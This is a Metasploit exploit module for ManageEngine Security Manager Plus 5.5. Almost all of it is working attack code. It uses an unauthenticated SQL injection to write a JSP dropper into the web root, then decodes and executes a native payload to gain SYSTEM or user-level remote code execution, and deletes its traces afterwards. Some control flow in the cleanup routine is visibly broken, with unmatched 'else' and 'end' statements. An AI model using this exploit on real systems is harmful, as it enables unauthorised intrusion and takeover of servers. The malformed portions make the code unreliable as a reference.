# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "ManageEngine Security Manager Plus 5.5 build 5505 SQL Injection",
            &#039;Description&#039;    => %q{
                    This module exploits a SQL injection found in ManageEngine Security Manager Plus
                advanced search page, which results in remote code execution under the context of
                SYSTEM in Windows; or as the user in Linux.  Authentication is not required in order
                to exploit this vulnerability.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;xistence <xistence[at]0x90.nl>&#039;,  # Discovery & Metasploit module
                    &#039;sinn3r&#039;,                          # Improved Metasploit module
                    &#039;egypt&#039;                            # Improved Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [&#039;EDB&#039;,&#039;22094&#039;],
                    [&#039;BID&#039;, &#039;56138&#039;]
                ],
            &#039;Platform&#039;       => [&#039;win&#039;, &#039;linux&#039;],
            &#039;Targets&#039;        =>
                [
                    [&#039;Automatic&#039;, {}],
                    [&#039;Windows&#039;,   { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;win&#039;   }],
                    [&#039;Linux&#039;,     { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039; }]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Oct 18 2012"))
 
        register_options(
            [
                OptPort.new(&#039;RPORT&#039;, [true, &#039;The target port&#039;, 6262])
            ], self.class)
    end
 
 
    def check
        res = sqli_exec(Rex::Text.rand_text_alpha(1))
 
        if res and res.body =~ /Error during search/
            return Exploit::CheckCode::Appears
        else
            return Exploit::CheckCode::Safe
        end
    end
 
 
    def pick_target
        return target if target.name != &#039;Automatic&#039;
 
        rnd_num   = Rex::Text.rand_text_numeric(1)
        rnd_fname = Rex::Text.rand_text_alpha(5) + ".txt"
        outpath   = "../../webapps/SecurityManager/#{rnd_fname}"
 
        @clean_ups << outpath
 
        sqli  = "#{rnd_num})) union select @@version,"
        sqli << (2..28).map {|e| e} * ","
        sqli << " into outfile \"#{outpath}\" FROM mysql.user WHERE #{rnd_num}=((#{rnd_num}"
        sqli_exec(sqli)
 
        res = send_request_raw({&#039;uri&#039;=>"/#{rnd_fname}"})
 
        # What @@version returns:
        # Linux   = 5.0.36-enterprise
        # Windows = 5.0.36-enterprise-nt
 
        if res and res.body =~ /\d\.\d\.\d\d\-enterprise\-nt/
            print_status("#{rhost}:#{rport} - Target selected: #{targets[1].name}")
            return targets[1]  # Windows target
        elsif res and res.body =~ /\d\.\d\.\d\d\-enterprise/
            print_status("#{rhost}:#{rport} - Target selected: #{targets[2].name}")
            return targets[2]
        end
 
        return nil
    end
 
 
    #
    # We&#039;re in SecurityManager/bin at this point
    #
    def on_new_session(cli)
        if target[&#039;Platform&#039;] == &#039;linux&#039;
            print_warning("Malicious executable is removed during payload execution")
        end
 
            cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
        end
 
        @clean_ups.each { |f|
            base = File.basename(f)
            f = "../webapps/SecurityManager/#{base}"
            print_warning("#{rhost}:#{rport} - Deleting: \"#{base}\"")
 
            begin
                    cli.fs.file.rm(f)
                else
                    del_cmd = (@my_target[&#039;Platform&#039;] == &#039;linux&#039;) ? &#039;rm&#039; : &#039;del&#039;
                    f = f.gsub(/\//, &#039;\\&#039;) if @my_target[&#039;Platform&#039;] == &#039;win&#039;
                    cli.shell_command_token("#{del_cmd} \"#{f}\"")
                end
 
                print_good("#{rhost}:#{rport} - \"#{base}\" deleted")
            rescue ::Exception => e
                print_error("Unable to delete: #{e.message}")
            end
        }
    end
 
 
    #
    # Embeds our executable in JSP
    #
    def generate_jsp_payload
        opts                = {:arch => @my_target.arch, :platform => @my_target.platform}
        native_payload      = Rex::Text.encode_base64(generate_payload_exe(opts))
        native_payload_name = Rex::Text.rand_text_alpha(rand(6)+3)
        ext                 = (@my_target[&#039;Platform&#039;] == &#039;win&#039;) ? &#039;.exe&#039; : &#039;.bin&#039;
 
        var_raw     = Rex::Text.rand_text_alpha(rand(8) + 3)
        var_ostream = Rex::Text.rand_text_alpha(rand(8) + 3)
        var_buf     = Rex::Text.rand_text_alpha(rand(8) + 3)
        var_decoder = Rex::Text.rand_text_alpha(rand(8) + 3)
        var_tmp     = Rex::Text.rand_text_alpha(rand(8) + 3)
        var_path    = Rex::Text.rand_text_alpha(rand(8) + 3)
        var_proc2   = Rex::Text.rand_text_alpha(rand(8) + 3)
 
        if @my_target[&#039;Platform&#039;] == &#039;linux&#039;
            var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)
            chmod = %Q|
            Process #{var_proc1} = Runtime.getRuntime().exec("chmod 777 " + #{var_path});
            Thread.sleep(200);
            |
 
            var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)
            cleanup = %Q|
            Thread.sleep(200);
            Process #{var_proc3} = Runtime.getRuntime().exec("rm " + #{var_path});
            |
        else
            chmod   = &#039;&#039;
            cleanup = &#039;&#039;
        end
 
        jsp = %Q|
        <%@page import="java.io.*"%>
        <%@page import="sun.misc.BASE64Decoder"%>
 
        <%
        byte[] #{var_raw} = null;
        BufferedOutputStream #{var_ostream} = null;
        try {
            String #{var_buf} = "#{native_payload}";
 
            BASE64Decoder #{var_decoder} = new BASE64Decoder();
            #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());
 
            File #{var_tmp} = File.createTempFile("#{native_payload_name}", "#{ext}");
            String #{var_path} = #{var_tmp}.getAbsolutePath();
 
            #{var_ostream} = new BufferedOutputStream(new FileOutputStream(#{var_path}));
            #{var_ostream}.write(#{var_raw});
            #{var_ostream}.close();
            #{chmod}
            Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});
            #{cleanup}
        } catch (Exception e) {
        }
        %>
        |
 
        jsp = jsp.gsub(/\n/, &#039;&#039;)
        jsp = jsp.gsub(/\t/, &#039;&#039;)
 
        jsp.unpack("H*")[0]
    end
 
    def sqli_exec(sqli_string)
        cookie  = &#039;STATE_COOKIE=&&#039;
        cookie << &#039;SecurityManager/ID/174/HomePageSubDAC_LIST/223/SecurityManager_CONTENTAREA_LIST/226/MainDAC_LIST/166&&#039;
        cookie << &#039;MainTabs/ID/167/_PV/174/selectedView/Home&&#039;
        cookie << &#039;Home/ID/166/PDCA/MainDAC/_PV/174&&#039;
        cookie << &#039;HomePageSub/ID/226/PDCA/SecurityManager_CONTENTAREA/_PV/166&&#039;
        cookie << &#039;HomePageSubTab/ID/225/_PV/226/selectedView/HomePageSecurity&&#039;
        cookie << &#039;HomePageSecurity/ID/223/PDCA/HomePageSubDAC/_PV/226&&#039;
        cookie << &#039;_REQS/_RVID/SecurityManager/_TIME/31337; &#039;
        cookie << &#039;2RequestsshowThreadedReq=showThreadedReqshow; &#039;
        cookie << &#039;2RequestshideThreadedReq=hideThreadedReqhide;&#039;
 
        state_id = Rex::Text.rand_text_numeric(5)
 
        send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => "/STATE_ID/#{state_id}/jsp/xmlhttp/persistence.jsp",
            &#039;headers&#039;   => {
                &#039;Cookie&#039; => cookie,
                &#039;Accept-Encoding&#039; => &#039;identity&#039;
            },
            &#039;vars_get&#039;  => {
                &#039;reqType&#039;    =>&#039;AdvanceSearch&#039;,
                &#039;SUBREQUEST&#039; =>&#039;XMLHTTP&#039;
            },
            &#039;vars_post&#039; => {
                &#039;ANDOR&#039;       => &#039;and&#039;,
                &#039;condition_1&#039; => &#039;OpenPorts@PORT&#039;,
                &#039;operator_1&#039;  => &#039;IN&#039;,
                &#039;value_1&#039;     => sqli_string,
                &#039;COUNT&#039;       => &#039;1&#039;
            }
        })
    end
 
    #
    # Run the actual exploit
    #
    def inject_exec(out)
        hex_jsp = generate_jsp_payload
        rnd_num = Rex::Text.rand_text_numeric(1)
        sqli  = "#{rnd_num})) union select 0x#{hex_jsp},"
        sqli << (2..28).map {|e| e} * ","
        sqli << " into outfile \"#{out}\" FROM mysql.user WHERE #{rnd_num}=((#{rnd_num}"
 
        print_status("#{rhost}:#{rport} - Trying SQL injection...")
        sqli_exec(sqli)
 
        fname = "/#{File.basename(out)}"
        print_status("#{rhost}:#{rport} - Requesting #{fname}")
        send_request_raw({&#039;uri&#039; => fname})
 
        handler
    end
 
 
    def exploit
        # This is used to collect files we want to delete later
        @clean_ups = []
 
        @my_target = pick_target
        if @my_target.nil?
            print_error("#{rhost}:#{rport} - Unable to select a target, we must bail.")
            return
        end
 
        jsp_name  = rand_text_alpha(rand(6)+3)
        outpath   = "../../webapps/SecurityManager/#{jsp_name + &#039;.jsp&#039;}"
 
        @clean_ups << outpath
 
        inject_exec(outpath)
    end
end

